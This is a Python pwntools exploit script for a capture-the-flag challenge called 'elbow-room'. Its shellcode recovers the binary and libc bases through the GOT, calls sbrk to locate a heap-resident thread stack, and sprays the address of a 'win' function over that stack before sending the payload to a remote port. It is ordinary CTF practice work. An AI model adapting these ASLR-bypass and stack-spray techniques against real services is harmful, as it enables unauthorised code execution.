import argparse
import time

from pwn import *

context.arch = "amd64"
context.terminal = ['alacritty', '-e', 'bash', '-c']

DEBUG = False

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

args = parser.parse_args()
HOST, PORT = args.address.split(':')
PORT = int(PORT)

binary_path = "../../../handouts/elbow-room/handout/challenge"
b = ELF(binary_path)

if DEBUG:
    libc = b.libc
    assert libc is not None
else:
    libc_path = "../../../handouts/elbow-room/handout/libc.so.6"
    libc = ELF(libc_path)


do_shellcode_offset = b.symbols["do_shellcode"]
win_offset = b.symbols['win']

read_got = b.got['read']
read_offset = libc.symbols['read']
sbrk_offset = libc.symbols['sbrk']

# get binary base
# get win address
# get address of sbrk in libc
# call sbrk(0), get end of heap
# spray win address over other thread's stack (which is the first 0x4000 on the heap)

shellcode = asm(f"""
mov rax, [rsp] # rax has return address, which is &do_shellcode+80
sub rax, 80 # we have &do_shellcode in rax
sub rax, {do_shellcode_offset} # rax has the binary base
mov r11, rax # copy binary base in r11
add r11, {win_offset+8} # store win function in r11
add rax, {read_got} # rax is got address of read
mov rax, [rax] # rax is address of read in libc
sub rax, {read_offset} # rax is libc base

add rax, {sbrk_offset}
xor rdi, rdi
call rax # rax has heap end address

mov rcx, 0x22000 # rcx is offset from the end of the heap
loop: # Spray the win address over the entire stack
mov rbx, rax
sub rbx, rcx
mov qword ptr [rbx], r11
add rcx, 8
cmp rcx, 0x26000 # heap is 0x26000 long - stop at the beginning
jl loop
ret
""")


gdbscript = """
b *thread_task+55
c
"""

if DEBUG:
    r = gdb.debug(binary_path, gdbscript)
else:
    r = remote(HOST, PORT)

time.sleep(1)
r.send(shellcode)

r.interactive()
